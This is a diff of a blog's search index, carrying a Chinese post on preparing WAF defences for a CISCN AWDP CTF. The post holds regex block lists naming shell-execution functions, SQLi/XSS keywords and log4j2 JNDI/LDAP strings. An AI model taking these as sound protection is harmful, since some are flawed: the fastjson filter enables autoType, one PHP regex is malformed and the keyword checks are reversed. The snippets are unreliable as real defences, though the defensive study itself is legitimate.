@@ -313,6 +313,69 @@
       </tags>
   </entry>
   <entry>
+    <title>[CISCN 2024线下赛]备战AWDP</title>
+    <url>/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP.html</url>
+    <content><![CDATA[<p>备战6月22日的CISCN线下赛 AWDP</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CISCN华东南赛区我们学校是承办方，当然晋级名额变成三队，不过由于本人实力有限加上最后黑灯的时候差一点做出来<code>easycms-revenge</code>，本来都打算退役了。在看到主办方发的晋级名单后，发现我们以倒一晋级线下赛，实在是续了下香火。既然都进了，总不能玩几小时pvz吧，所以打算从今天开始备战AWDP</p>
+<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p>
+<p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p>
+<p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分。</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>AWDP包括攻击和防守，比赛的时候要两边都顾，如果在攻击无果的情况下，可以往修复上看，因为防守成功也会得分。</p>
+<h1 id="防守WAF"><a href="#防守WAF" class="headerlink" title="防守WAF"></a>防守WAF</h1><p><a href="https://github.com/Drun1baby/JavaSecFilters/tree/main/PHP">参考文章</a></p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafrce($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|tail|flag|exec|base64|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafsqli($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafxss($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 允许上传的文件类型</span><br><span class="line">$allowedExtensions = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line"></span><br><span class="line">// 上传文件的目录</span><br><span class="line">$uploadDir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">// 检查文件是否上传成功</span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $file = $_FILES[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取文件的扩展名</span><br><span class="line">    $extension = pathinfo($file[&quot;name&quot;], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    // 检查文件类型是否允许上传</span><br><span class="line">    if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">        echo &quot;只允许上传以下类型的文件: &quot; . implode(&quot;, &quot;, $allowedExtensions);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查上传文件是否为真实的图像文件</span><br><span class="line">    if (getimagesize($file[&quot;tmp_name&quot;]) === false) &#123;</span><br><span class="line">        echo &quot;上传文件不是有效的图像文件。&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成一个唯一的文件名以避免重复</span><br><span class="line">    $uniqueFileName = uniqid() . &quot;.&quot; . $extension;</span><br><span class="line"></span><br><span class="line">    // 移动上传的文件到目标目录</span><br><span class="line">    if (move_uploaded_file($file[&quot;tmp_name&quot;], $uploadDir . $uniqueFileName)) &#123;</span><br><span class="line">        echo &quot;文件上传成功！&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件上传失败。&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xmlData = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">$xml = simplexml_load_string($xmlData);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><p>自定义过滤关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const keywords = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line"></span><br><span class="line">for (const i of keywords) &#123;</span><br><span class="line">    if (code.includes(i)) &#123;</span><br><span class="line">        console.log(&quot;Hacker!&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词-1"><a href="#自定义过滤关键词-1" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> 去到对应的接口下面修改即可</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 SSRF 的自定义防护</span><br><span class="line"> @ ban 了几个协议，如果单纯全部阻挡什么 127.0.0.1，业务不一定过得去。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class sqlFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;file|http|jar|gopher|tar|war&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含SQL关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ruoyi.common.xss;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 log4j2 的自定义防护</span><br><span class="line"> @ 过滤 url：在 WebFilter 当中添加 urlPatterns</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class Log4j2Filter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;$|$$|jndi|rmi|ldap|&#123;|&#125;|&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含log4j2关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于文件上传的接口修改</span><br><span class="line"> @ 需要在对应接口中修改</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class securityUpload &#123;</span><br><span class="line">    @RequestMapping(&quot;/securityUpload&quot;)</span><br><span class="line">    public String handleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file)&#123;</span><br><span class="line">        if (file.isEmpty())&#123;</span><br><span class="line">            return &quot;请上传文件&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件名</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        String contentType = file.getContentType();</span><br><span class="line"></span><br><span class="line">        //过滤</span><br><span class="line">        String[] picWhite = &#123;&quot;.png&quot;,&quot;.jpg&quot;,&quot;.gif&quot;,&quot;.webp&quot;,&quot;.bmp&quot;&#125;;</span><br><span class="line">        String[] white_type = &#123;&quot;image/gif&quot;,&quot;image/jpeg&quot;,&quot;image/jpg&quot;,&quot;image/png&quot;&#125;;</span><br><span class="line">        Boolean SuffixFlag = false;</span><br><span class="line">        Boolean TypeFlag = false;</span><br><span class="line">        for (String pic_suffix:picWhite)&#123;</span><br><span class="line">            if (suffix.toLowerCase().equals(pic_suffix))&#123;</span><br><span class="line">                SuffixFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        for (String white_suffix:white_type)&#123;</span><br><span class="line">            if (contentType.toLowerCase().equals(white_suffix))&#123;</span><br><span class="line">                TypeFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!SuffixFlag||!TypeFlag)&#123;</span><br><span class="line">            return &quot;File Type not allow&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filePath = System.getProperty(&quot;user.dir&quot;)+&quot;/tmp&quot;;</span><br><span class="line"></span><br><span class="line">        Date date = new Date();</span><br><span class="line">        SimpleDateFormat dateFormat = new SimpleDateFormat(&quot;yyyyMMddhhmmss&quot;);</span><br><span class="line">        String newfileName = dateFormat.format(date)+Integer.toHexString((int)new Date().getTime())+suffix;</span><br><span class="line"></span><br><span class="line">        File dest = new File(filePath+File.separator+newfileName);</span><br><span class="line">        if (!dest.getParentFile().exists())&#123;</span><br><span class="line">            dest.getParentFile().mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        try&#123;</span><br><span class="line">            file.transferTo(dest);</span><br><span class="line">            return &quot;上传成功&quot;;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package FastjsonFilters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 Fastjson 的自定义防护</span><br><span class="line"> @ 针对 1.2.24 版本，则只添加过滤即可，若针对其他版本</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(false); 将 autoTypeSupprt 设置为 false</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Fastjson1224Filter &#123;</span><br><span class="line">    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception &#123;</span><br><span class="line">        if (str != null &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;</span><br><span class="line">            Pattern p = Pattern.compile(pattern, 2);</span><br><span class="line">            boolean StrMatch = p.matcher(input).matches();</span><br><span class="line">            if (StrMatch) &#123;</span><br><span class="line">                return &quot;Hacker get out!!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">            JSON.parseObject(input);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><h3 id="自定义过滤关键词-2"><a href="#自定义过滤关键词-2" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
+<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php $(dirname `find / -name &#x27;explorer.php&#x27; 2&gt;/dev/null`)/explorer.php</span><br></pre></td></tr></table></figure>
+
+<p>用find命令从根目录查找名为<code>explorer.php</code>的文件，然后返回他的路径名<code>dirname</code>，<code>2&gt;/dev/null</code>的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://5ime.cn/awdp.html">https://5ime.cn/awdp.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_51614272/article/details/125527593">https://blog.csdn.net/weixin_51614272/article/details/125527593</a></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>AWDP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bumblebee-HackTheBox</title>
     <url>/article/Bumblebee-HackTheBox.html</url>
     <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
@@ -392,69 +455,6 @@
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[CISCN 2024线下赛]备战AWDP</title>
-    <url>/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP.html</url>
-    <content><![CDATA[<p>备战6月22日的CISCN线下赛 AWDP</p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CISCN华东南赛区我们学校是承办方，当然晋级名额变成三队，不过由于本人实力有限加上最后黑灯的时候差一点做出来<code>easycms-revenge</code>，本来都打算退役了。在看到主办方发的晋级名单后，发现我们以倒一晋级线下赛，实在是续了下香火。既然都进了，总不能玩几小时pvz吧，所以打算从今天开始备战AWDP</p>
-<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p>
-<p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p>
-<p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分。</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>AWDP包括攻击和防守，比赛的时候要两边都顾，如果在攻击无果的情况下，可以往修复上看，因为防守成功也会得分。</p>
-<h1 id="防守WAF"><a href="#防守WAF" class="headerlink" title="防守WAF"></a>防守WAF</h1><p><a href="https://github.com/Drun1baby/JavaSecFilters/tree/main/PHP">参考文章</a></p>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafrce($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|tail|flag|exec|base64|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafsqli($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafxss($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 允许上传的文件类型</span><br><span class="line">$allowedExtensions = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line"></span><br><span class="line">// 上传文件的目录</span><br><span class="line">$uploadDir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">// 检查文件是否上传成功</span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $file = $_FILES[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取文件的扩展名</span><br><span class="line">    $extension = pathinfo($file[&quot;name&quot;], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">    // 检查文件类型是否允许上传</span><br><span class="line">    if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">        echo &quot;只允许上传以下类型的文件: &quot; . implode(&quot;, &quot;, $allowedExtensions);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查上传文件是否为真实的图像文件</span><br><span class="line">    if (getimagesize($file[&quot;tmp_name&quot;]) === false) &#123;</span><br><span class="line">        echo &quot;上传文件不是有效的图像文件。&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成一个唯一的文件名以避免重复</span><br><span class="line">    $uniqueFileName = uniqid() . &quot;.&quot; . $extension;</span><br><span class="line"></span><br><span class="line">    // 移动上传的文件到目标目录</span><br><span class="line">    if (move_uploaded_file($file[&quot;tmp_name&quot;], $uploadDir . $uniqueFileName)) &#123;</span><br><span class="line">        echo &quot;文件上传成功！&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件上传失败。&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xmlData = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">$xml = simplexml_load_string($xmlData);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>
-
-<h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><p>自定义过滤关键词</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const keywords = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line"></span><br><span class="line">for (const i of keywords) &#123;</span><br><span class="line">    if (code.includes(i)) &#123;</span><br><span class="line">        console.log(&quot;Hacker!&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词-1"><a href="#自定义过滤关键词-1" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
